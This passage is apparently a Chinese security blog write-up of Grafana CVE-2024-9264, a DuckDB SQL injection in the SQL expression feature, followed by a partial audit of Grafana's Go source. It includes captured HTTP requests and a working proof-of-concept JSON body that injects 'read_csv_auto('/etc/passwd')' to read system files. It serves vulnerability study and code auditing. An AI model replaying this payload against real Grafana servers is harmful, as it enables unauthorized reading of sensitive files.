登录管理后台。</p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><h2 id="2-1-漏洞概述"><a href="#2-1-漏洞概述" class="headerlink" title="2.1 漏洞概述"></a>2.1 漏洞概述</h2><p>Grafana 的一个实验性 SQL 表达式功能中存在一个 DuckDB SQL 注入漏洞。</p><p>任何<strong>经过身份验证</strong>的用户都可以通过修改 Grafana 仪表板中的表达式执行任意 DuckDB SQL 查询。</p><blockquote><p>什么是DuckDB？</p><p>DuckDB是一个轻量级、嵌入式的SQL OLAP数据库管理系统，旨在提供高性能的数据分析。它支持标准SQL，允许在应用程序内部处理数据，无需外部数据库服务器。DuckDB优化了内存使用，通过列存储和数据压缩技术，提高了数据访问速度和查询效率。此外，它还具备跨平台兼容性，支持Windows、Linux和macOS，使得开发者可以在多种操作系统上部署和使用。DuckDB的开源特性也使其易于扩展和定制，满足特定需求。</p></blockquote><p>利用条件：</p><ol><li><p>有账号密码，可以登陆. </p></li><li><p>服务器安装了duckDB.（默认没安装）</p></li><li><p>使用有漏洞的版本.</p></li></ol><h2 id="2-2-漏洞位置"><a href="#2-2-漏洞位置" class="headerlink" title="2.2 漏洞位置"></a>2.2 漏洞位置</h2><p>漏洞点在仪表盘创建处。这里可以输入表达式，执行一些函数命令。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2011.30.43.png" style="zoom:50%;"><h2 id="2-3-抓包分析"><a href="#2-3-抓包分析" class="headerlink" title="2.3 抓包分析"></a>2.3 抓包分析</h2><p>在Expression处输入内容test并回车，BP抓到的请求包内容如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /api/ds/query?ds_type<span class="token operator">=</span>__expr__<span class="token operator">&amp;</span><span class="token assign-left variable">expression</span><span class="token operator">=</span>true<span class="token operator">&amp;</span><span class="token assign-left variable">requestId</span><span class="token operator">=</span>Q102 HTTP/1.1Host: <span class="token number">192.168</span>.155.31:3000User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac OS X <span class="token number">10.15</span><span class="token punctuation">;</span> rv:134.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/134.0Accept: application/json, text/plain, */*Accept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,zh-TW<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>,zh-HK<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.5</span>,en-US<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.3</span>,en<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.2</span>Accept-Encoding: gzip, deflateReferer: http://192.168.155.31:3000/dashboard/new?orgId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">editPanel</span><span class="token operator">=</span><span class="token number">1</span>content-type: application/jsonx-datasource-uid: grafanax-grafana-device-id: 619ca89a5f27e3a3f1bd260aead26594x-grafana-from-expr: <span class="token boolean">true</span>x-grafana-org-id: <span class="token number">1</span>x-panel-id: <span class="token number">1</span>x-panel-plugin-id: timeseriesx-plugin-id: datasourceContent-Length: <span class="token number">350</span>Origin: http://192.168.155.31:3000Connection: closeCookie: <span class="token assign-left variable">grafana_session</span><span class="token operator">=</span>86e5a674ff2f29d015081887dbebfa42<span class="token punctuation">;</span> <span class="token assign-left variable">grafana_session_expiry</span><span class="token operator">=</span><span class="token number">1734931671</span>Priority: <span class="token assign-left variable">u</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">{</span><span class="token string">"queries"</span><span class="token builtin class-name">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"queryType"</span><span class="token builtin class-name">:</span><span class="token string">"randomWalk"</span>,<span class="token string">"datasource"</span>:<span class="token punctuation">{</span><span class="token string">"uid"</span><span class="token builtin class-name">:</span><span class="token string">"grafana"</span>,<span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"datasource"</span><span class="token punctuation">}</span>,<span class="token string">"refId"</span><span class="token builtin class-name">:</span><span class="token string">"A"</span>,<span class="token string">"datasourceId"</span>:-1,<span class="token string">"intervalMs"</span>:20000,<span class="token string">"maxDataPoints"</span>:1059<span class="token punctuation">}</span>,<span class="token punctuation">{</span><span class="token string">"refId"</span><span class="token builtin class-name">:</span><span class="token string">"B"</span>,<span class="token string">"datasource"</span>:<span class="token punctuation">{</span><span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"__expr__"</span>,<span class="token string">"uid"</span><span class="token builtin class-name">:</span><span class="token string">"__expr__"</span>,<span class="token string">"name"</span><span class="token builtin class-name">:</span><span class="token string">"Expression"</span><span class="token punctuation">}</span>,<span class="token string">"type"</span><span class="token builtin class-name">:</span><span class="token string">"math"</span>,<span class="token string">"hide"</span>:false,<span class="token string">"expression"</span><span class="token builtin class-name">:</span><span class="token string">"test<span class="token entity" title="\n">\n</span>"</span>,<span class="token string">"window"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span class="token punctuation">]</span>,<span class="token string">"from"</span><span class="token builtin class-name">:</span><span class="token string">"1734909521360"</span>,<span class="token string">"to"</span><span class="token builtin class-name">:</span><span class="token string">"1734931121360"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>响应内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">HTTP/1.1 <span class="token number">500</span> Internal Server ErrorCache-Control: no-storeContent-Type: application/jsonX-Content-Type-Options: nosniffX-Frame-Options: denyX-Xss-Protection: <span class="token number">1</span><span class="token punctuation">;</span> <span class="token assign-left variable">mode</span><span class="token operator">=</span>blockDate: Mon, <span class="token number">23</span> Dec <span class="token number">2024</span> 05:19:14 GMTContent-Length: <span class="token number">43</span>Connection: close<span class="token punctuation">{</span><span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Query data error"</span>,<span class="token string">"traceID"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2013.19.30.png" alt="截屏2024-12-23 13.19.30"></p><h2 id="2-4-漏洞初步测试"><a href="#2-4-漏洞初步测试" class="headerlink" title="2.4 漏洞初步测试"></a>2.4 漏洞初步测试</h2><p>修改expression参数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"expression"</span><span class="token builtin class-name">:</span><span class="token string">"SELECT * FROM read_blob('/etc/passwd');<span class="token entity" title="\n">\n</span>"</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"message"</span><span class="token builtin class-name">:</span><span class="token string">"Data source not found"</span>,<span class="token string">"traceID"</span><span class="token builtin class-name">:</span><span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并没有获得预期的/etc/passwd的内容。</p><p>尝试其他方法也不行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"expression"</span><span class="token builtin class-name">:</span> <span class="token string">"SELECT * FROM read_csv_auto('/etc/passwd');"</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据提示，缺乏相应的数据源。</p><h2 id="2-5-安装DuckDB"><a href="#2-5-安装DuckDB" class="headerlink" title="2.5 安装DuckDB"></a>2.5 安装DuckDB</h2><p>需要特别注意⚠️：</p><ul><li><p>该漏洞是真对DuckDB的sql注入，所以利用条件除了安装grafana之外，还需要安装duckDB，后续创建仪表盘的时候选择DuckDB数据源。</p></li><li><p><code>duckdb</code> 二进制文件必须存在于 Grafana 的 <code>$PATH</code> 中，此攻击才能成功；默认情况下，此二进制文件未安装在 Grafana 发行版中。</p></li></ul><h3 id="2-5-1-下载安装包"><a href="#2-5-1-下载安装包" class="headerlink" title="2.5.1 下载安装包"></a>2.5.1 下载安装包</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://github.com/duckdb/duckdb/releases/download/v0.8.1/duckdb_cli-linux-amd64.zip<span class="token function">unzip</span> duckdb_cli-linux-amd64.zip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.23.46.png" alt="截屏2024-12-23 14.23.46"></p><p>解压之后即可运行。</p><h3 id="2-5-2-解压使用"><a href="#2-5-2-解压使用" class="headerlink" title="2.5.2 解压使用"></a>2.5.2 解压使用</h3><p>执行./duckdb即可进入数据库。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.25.02.png" style="zoom:50%;"><p>执行如下命令即可查看本地文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SELECT * FROM read_csv_auto<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.25.48.png" style="zoom:50%;"><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.28.07.png" style="zoom:50%;"><p>能够查询到本地的敏感文件。</p><p>所以如果grafana的表达式如果未经过滤直接交给duckDB执行，就会存在读区敏感文件的风险。</p><h3 id="2-5-3-直接安装到-usr-local-bin-并设置PATH环境变量"><a href="#2-5-3-直接安装到-usr-local-bin-并设置PATH环境变量" class="headerlink" title="2.5.3 直接安装到/usr/local/bin/ 并设置PATH环境变量"></a>2.5.3 直接安装到/usr/local/bin/ 并设置PATH环境变量</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">unzip</span> /tmp/duckdb_cli-linux-amd64.zip <span class="token parameter variable">-d</span> /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.32.15.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>base<span class="token punctuation">)</span> sxk@sxk-ubuntu22:~/Desktop$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/home/sxk/anaconda3/bin:/home/sxk/anaconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>/usr/local/bin已经在PATH中了，如果不在需要按照如下方法设置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">通过修改profile文件:<span class="token function">vim</span> /etc/profile<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/bin:<span class="token environment constant">$PATH</span>生效方法：系统重启有效期限：永久有效用户局限：对所有用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-6-POC测试，成功读取到-etc-passwd的数据"><a href="#2-6-POC测试，成功读取到-etc-passwd的数据" class="headerlink" title="2.6 POC测试，成功读取到/etc/passwd的数据"></a>2.6 POC测试，成功读取到/etc/passwd的数据</h2><p>抓包之后，用下面的POC替换POST数据。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span>  <span class="token string">"from"</span><span class="token builtin class-name">:</span> <span class="token string">"1696154400000"</span>,  <span class="token string">"to"</span><span class="token builtin class-name">:</span> <span class="token string">"1696345200000"</span>,  <span class="token string">"queries"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>    <span class="token punctuation">{</span>      <span class="token string">"datasource"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>        <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"Expression"</span>,        <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"__expr__"</span>,        <span class="token string">"uid"</span><span class="token builtin class-name">:</span> <span class="token string">"__expr__"</span>      <span class="token punctuation">}</span>,      <span class="token string">"expression"</span><span class="token builtin class-name">:</span> <span class="token string">"SELECT * FROM read_csv_auto('/etc/passwd');"</span>,      <span class="token string">"hide"</span><span class="token builtin class-name">:</span> false,      <span class="token string">"refId"</span><span class="token builtin class-name">:</span> <span class="token string">"B"</span>,      <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"sql"</span>,      <span class="token string">"window"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>    <span class="token punctuation">}</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2014.45.08.png" style="zoom:50%;"><p>抓包重放，修改expression的内容，成功获取到/etc/passwd敏感数据。</p><h1 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h1><h2 id="3-1-获取源代码"><a href="#3-1-获取源代码" class="headerlink" title="3.1 获取源代码"></a>3.1 获取源代码</h2><p><a href="https://github.com/grafana/grafana/releases?q=11.1.0&amp;expanded=true">https://github.com/grafana/grafana/releases?q=11.1.0&amp;expanded=true</a></p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2015.27.22.png" style="zoom:50%;"><h2 id="3-2-代码审计"><a href="#3-2-代码审计" class="headerlink" title="3.2 代码审计"></a>3.2 代码审计</h2><h3 id="3-2-1-根据API路由定位后端代码"><a href="#3-2-1-根据API路由定位后端代码" class="headerlink" title="3.2.1 根据API路由定位后端代码"></a>3.2.1 根据API路由定位后端代码</h3><p>在源代码文件中搜索/api/ds/query，可以看到处理表达式的代码。</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.12.54.png" alt="截屏2024-12-23 16.12.54" style="zoom:50%;"><blockquote><p>go中的:=</p><p>在Go语言中，<code>:=</code> 是一个短变量声明操作符，用于在函数内部声明并初始化局部变量。它结合了变量声明和值赋值的操作。如果变量之前没有被声明过，<code>:=</code> 会声明一个新的变量，并将其初始化为右侧表达式的值。如果变量已经声明过，<code>:=</code> 则只会给该变量赋值。</p><p>在Go语言中，定义方法（method）的语法遵循以下规则：</p><ol><li><strong>接收者（Receiver）</strong>：方法可以有零个或多个接收者。接收者定义了方法是属于哪个类型的。</li><li><strong>方法名</strong>：方法名必须以大写字母开头，以便在包外可见（导出）。</li><li><strong>参数列表</strong>：参数列表定义了方法接受的参数。</li><li><strong>返回类型</strong>：方法可以有零个或多个返回值，包括返回值的类型。</li><li><strong>方法体</strong>：方法的实现部分。</li></ol></blockquote><h3 id="3-2-2-handleExpressions函数"><a href="#3-2-2-handleExpressions函数" class="headerlink" title="3.2.2 handleExpressions函数"></a>3.2.2 handleExpressions函数</h3><p>handleExpressions函数的具体实现如下：</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// handleExpressions handles POST /api/ds/query when there is an expression.</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>ServiceImpl<span class="token punctuation">)</span> <span class="token function">handleExpressions</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> user identity<span class="token punctuation">.</span>Requester<span class="token punctuation">,</span> parsedReq <span class="token operator">*</span>parsedRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>backend<span class="token punctuation">.</span>QueryDataResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>exprReq <span class="token operator">:=</span> expr<span class="token punctuation">.</span>Request<span class="token punctuation">{</span>Queries<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">if</span> user <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span> <span class="token comment">// for passthrough authentication, SSE does not authenticate</span>exprReq<span class="token punctuation">.</span>User <span class="token operator">=</span> userexprReq<span class="token punctuation">.</span>OrgId <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">GetOrgID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> pq <span class="token operator">:=</span> <span class="token keyword">range</span> parsedReq<span class="token punctuation">.</span><span class="token function">getFlattenedQueries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> pq<span class="token punctuation">.</span>datasource <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrMissingDataSourceInfo<span class="token punctuation">.</span><span class="token function">Build</span><span class="token punctuation">(</span>errutil<span class="token punctuation">.</span>TemplateData<span class="token punctuation">{</span>Public<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>any<span class="token punctuation">{</span><span class="token string">"RefId"</span><span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>exprReq<span class="token punctuation">.</span>Queries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>exprReq<span class="token punctuation">.</span>Queries<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span>JSON<span class="token punctuation">:</span>          pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>JSON<span class="token punctuation">,</span>Interval<span class="token punctuation">:</span>      pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Interval<span class="token punctuation">,</span>RefID<span class="token punctuation">:</span>         pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>MaxDataPoints<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>MaxDataPoints<span class="token punctuation">,</span>QueryType<span class="token punctuation">:</span>     pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>QueryType<span class="token punctuation">,</span>DataSource<span class="token punctuation">:</span>    pq<span class="token punctuation">.</span>datasource<span class="token punctuation">,</span>TimeRange<span class="token punctuation">:</span> expr<span class="token punctuation">.</span>AbsoluteTimeRange<span class="token punctuation">{</span>From<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>From<span class="token punctuation">,</span>To<span class="token punctuation">:</span>   pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>To<span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>qdr<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span> <span class="token comment">// use time now because all queries have absolute time range</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"expression request error: %w"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">return</span> qdr<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码分析：</p><blockquote><h3 id="方法签名"><a href="#方法签名" class="headerlink" title="方法签名"></a>方法签名</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>ServiceImpl<span class="token punctuation">)</span> <span class="token function">handleExpressions</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> user identity<span class="token punctuation">.</span>Requester<span class="token punctuation">,</span> parsedReq <span class="token operator">*</span>parsedRequest<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>backend<span class="token punctuation">.</span>QueryDataResponse<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>接收者</strong>：<code>s *ServiceImpl</code> 表示这个方法是 <code>ServiceImpl</code> 结构体的一个方法，<code>s</code> 是该结构体的指针。</li><li>参数：<ul><li><code>ctx context.Context</code>：用于传递上下文信息，通常用于控制请求的生命周期和处理超时。</li><li><code>user identity.Requester</code>：表示请求的用户，通常包含用户的信息和权限。</li><li><code>parsedReq *parsedRequest</code>：表示解析后的请求，包含查询的详细信息。</li></ul></li><li><strong>返回值</strong>：返回一个指向 <code>backend.QueryDataResponse</code> 的指针和一个 <code>error</code>，表示处理结果和可能的错误。</li></ul><h3 id="初始化表达式请求："><a href="#初始化表达式请求：" class="headerlink" title="初始化表达式请求："></a><strong>初始化表达式请求</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">exprReq <span class="token operator">:=</span> expr<span class="token punctuation">.</span>Request<span class="token punctuation">{</span>    Queries<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建一个新的表达式请求 <code>exprReq</code>，其中包含一个空的查询列表。</p><h3 id="用户信息处理："><a href="#用户信息处理：" class="headerlink" title="用户信息处理："></a><strong>用户信息处理</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> user <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>    exprReq<span class="token punctuation">.</span>User <span class="token operator">=</span> user    exprReq<span class="token punctuation">.</span>OrgId <span class="token operator">=</span> user<span class="token punctuation">.</span><span class="token function">GetOrgID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果用户不为 <code>nil</code>，则将用户信息和组织ID添加到 <code>exprReq</code> 中。这通常用于身份验证和授权。</p><h3 id="处理解析后的查询："><a href="#处理解析后的查询：" class="headerlink" title="处理解析后的查询："></a><strong>处理解析后的查询</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> pq <span class="token operator">:=</span> <span class="token keyword">range</span> parsedReq<span class="token punctuation">.</span><span class="token function">getFlattenedQueries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> pq<span class="token punctuation">.</span>datasource <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrMissingDataSourceInfo<span class="token punctuation">.</span><span class="token function">Build</span><span class="token punctuation">(</span>errutil<span class="token punctuation">.</span>TemplateData<span class="token punctuation">{</span>            Public<span class="token punctuation">:</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>any<span class="token punctuation">{</span>                <span class="token string">"RefId"</span><span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>遍历解析后的查询 <code>parsedReq.getFlattenedQueries()</code>，对于每个查询：</p><ul><li>检查数据源是否存在。如果数据源为 <code>nil</code>，则返回一个错误，表明缺少数据源信息。</li></ul><h3 id="构建查询："><a href="#构建查询：" class="headerlink" title="构建查询："></a><strong>构建查询</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">exprReq<span class="token punctuation">.</span>Queries <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>exprReq<span class="token punctuation">.</span>Queries<span class="token punctuation">,</span> expr<span class="token punctuation">.</span>Query<span class="token punctuation">{</span>    JSON<span class="token punctuation">:</span>          pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>JSON<span class="token punctuation">,</span>    Interval<span class="token punctuation">:</span>      pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>Interval<span class="token punctuation">,</span>    RefID<span class="token punctuation">:</span>         pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>RefID<span class="token punctuation">,</span>    MaxDataPoints<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>MaxDataPoints<span class="token punctuation">,</span>    QueryType<span class="token punctuation">:</span>     pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>QueryType<span class="token punctuation">,</span>    DataSource<span class="token punctuation">:</span>    pq<span class="token punctuation">.</span>datasource<span class="token punctuation">,</span>    TimeRange<span class="token punctuation">:</span> expr<span class="token punctuation">.</span>AbsoluteTimeRange<span class="token punctuation">{</span>        From<span class="token punctuation">:</span> pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>From<span class="token punctuation">,</span>        To<span class="token punctuation">:</span>   pq<span class="token punctuation">.</span>query<span class="token punctuation">.</span>TimeRange<span class="token punctuation">.</span>To<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将每个查询的详细信息添加到 <code>exprReq.Queries</code> 中，包括查询的JSON、时间范围、数据源等。</p><h3 id="调用表达式服务："><a href="#调用表达式服务：" class="headerlink" title="调用表达式服务："></a><strong>调用表达式服务</strong>：</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">qdr<span class="token punctuation">,</span> err <span class="token operator">:=</span> s<span class="token punctuation">.</span>expressionService<span class="token punctuation">.</span><span class="token function">TransformData</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>exprReq<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>调用 <code>expressionService</code> 的 <code>TransformData</code> 方法，将当前时间和构建的表达式请求传递给它。这个方法会处理查询并返回结果。</p><h3 id="错误处理："><a href="#错误处理：" class="headerlink" 